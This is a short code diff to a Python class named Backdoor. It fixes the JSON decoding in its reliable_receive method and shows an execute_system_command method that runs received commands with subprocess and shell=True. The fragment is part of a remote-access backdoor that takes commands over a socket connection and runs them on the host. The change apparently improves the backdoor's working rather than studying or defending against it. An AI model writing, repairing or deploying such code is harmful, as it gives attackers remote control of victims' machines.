@@ -12,8 +12,8 @@ class Backdoor:
         self.connection.send(json_data.encode())
         
     def reliable_receive(self):
-        json_data = json.dumps(self.connection.recv(1024).decode())
-        return bytes(json.loads(json_data), "utf-8").decode("unicode_escape")
+        json_data = self.connection.recv(1024).decode()
+        return json.loads(json_data)
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
